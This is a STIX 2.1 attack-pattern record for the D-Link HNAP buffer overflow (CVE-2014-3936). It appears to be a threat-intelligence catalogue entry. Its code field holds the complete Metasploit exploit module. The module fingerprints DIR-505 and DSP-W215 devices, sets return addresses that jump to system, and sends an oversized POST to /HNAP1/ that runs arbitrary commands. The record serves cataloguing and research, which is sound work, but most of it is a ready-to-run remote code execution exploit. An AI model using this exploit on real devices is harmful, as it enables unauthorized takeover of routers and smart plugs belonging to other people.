{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7abbd5c4-1171-4250-8683-3c23d75124a1",
    "created": "2024-08-14T17:00:03.035701Z",
    "modified": "2024-08-14T17:00:03.035706Z",
    "name": "D-Link HNAP Request Remote Buffer Overflow",
    "description": " This module exploits an anonymous remote code execution vulnerability on different D-Link devices. The vulnerability is due to a stack based buffer overflow while handling malicious HTTP POST requests addressed to the HNAP handler. This module has been successfully tested on D-Link DIR-505 in an emulated environment. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/dlink_hnap_bof.rb",
            "external_id": "dlink_hnap_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-3936"
        },
        {
            "source_name": "reference",
            "url": "http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10029"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'D-Link HNAP Request Remote Buffer Overflow',\n      'Description'    => %q{\n        This module exploits an anonymous remote code execution vulnerability on different\n        D-Link devices. The vulnerability is due to a stack based buffer overflow while\n        handling malicious HTTP POST requests addressed to the HNAP handler. This module\n        has been successfully tested on D-Link DIR-505 in an emulated environment.\n      },\n      'Author'         =>\n        [\n          'Craig Heffner', # vulnerability discovery and initial exploit\n          'Michael Messner <devnull[at]s3cur1ty.de>' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'linux',\n      'Arch'           => ARCH_MIPSBE,\n      'References'     =>\n        [\n          ['CVE', '2014-3936'],\n          ['BID', '67651'],\n          ['URL', 'http://www.devttys0.com/2014/05/hacking-the-d-link-dsp-w215-smart-plug/'], # blog post from Craig including PoC\n          ['URL', 'http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10029']\n        ],\n      'Targets'        =>\n        [\n          #\n          # Automatic targeting via fingerprinting\n          #\n          [ 'Automatic Targeting', { 'auto' => true }  ],\n          [ 'D-Link DSP-W215 - v1.0',\n            {\n              'Offset'  => 1000000,\n              'Ret'     => 0x405cac, # jump to system - my_cgi.cgi\n            }\n          ],\n          [ 'D-Link DIR-505 - v1.06',\n            {\n              'Offset'  => 30000,\n              'Ret'     => 0x405234, # jump to system - my_cgi.cgi\n            }\n          ],\n          [ 'D-Link DIR-505 - v1.07',\n            {\n              'Offset'  => 30000,\n              'Ret'     => 0x405c5c, # jump to system - my_cgi.cgi\n            }\n          ]\n        ],\n      'DisclosureDate' => '2014-05-15',\n      'DefaultTarget'  => 0))\n\n    deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')\n  end\n\n  def check\n    begin\n      res = send_request_cgi({\n        'uri' => \"/HNAP1/\",\n        'method'  => 'GET'\n      })\n\n      if res && [200, 301, 302].include?(res.code)\n        if res.body =~ /DIR-505/ && res.body =~ /1.07/\n          @my_target = targets[3] if target['auto']\n          return Exploit::CheckCode::Appears\n        elsif res.body =~ /DIR-505/ && res.body =~ /1.06/\n          @my_target = targets[2] if target['auto']\n          return Exploit::CheckCode::Appears\n        elsif res.body =~ /DSP-W215/ && res.body =~ /1.00/\n          @my_target = targets[1] if target['auto']\n          return Exploit::CheckCode::Appears\n        else\n          return Exploit::CheckCode::Detected\n        end\n      end\n    rescue ::Rex::ConnectionError\n      return Exploit::CheckCode::Safe\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    print_status(\"Trying to access the vulnerable URL...\")\n\n    @my_target = target\n    check_code = check\n\n    unless check_code == Exploit::CheckCode::Detected || check_code == Exploit::CheckCode::Appears\n      fail_with(Failure::NoTarget, \"#{peer} - Failed to detect a vulnerable device\")\n    end\n\n    if @my_target.nil? || @my_target['auto']\n      fail_with(Failure::NoTarget, \"#{peer} - Failed to auto detect, try setting a manual target...\")\n    end\n\n    print_status(\"Exploiting #{@my_target.name}...\")\n    execute_cmdstager(\n      :flavor  => :echo,\n      :linemax => 185\n    )\n  end\n\n  def prepare_shellcode(cmd)\n    buf = rand_text_alpha_upper(@my_target['Offset'])  # Stack filler\n    buf << rand_text_alpha_upper(4)                    # $s0, don't care\n    buf << rand_text_alpha_upper(4)                    # $s1, don't care\n    buf << rand_text_alpha_upper(4)                    # $s2, don't care\n    buf << rand_text_alpha_upper(4)                    # $s3, don't care\n    buf << rand_text_alpha_upper(4)                    # $s4, don't care\n    buf << [@my_target.ret].pack(\"N\")                  # $ra\n\n           # la $t9, system\n           # la $s1, 0x440000\n           # jalr $t9 ; system\n           # addiu $a0, $sp, 0x28 # our command\n\n    buf << rand_text_alpha_upper(40)                # Stack filler\n    buf << cmd                                      # Command to execute\n    buf << \"\\x00\"                                   # NULL-terminate the command\n  end\n\n  def execute_command(cmd, opts)\n    shellcode = prepare_shellcode(cmd)\n\n    begin\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => \"/HNAP1/\",\n        'encode_params' => false,\n        'data' => shellcode\n      }, 5)\n      return res\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Failed to connect to the web server\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-05-15",
    "x_mitre_platforms": [
        "linux'"
    ]
}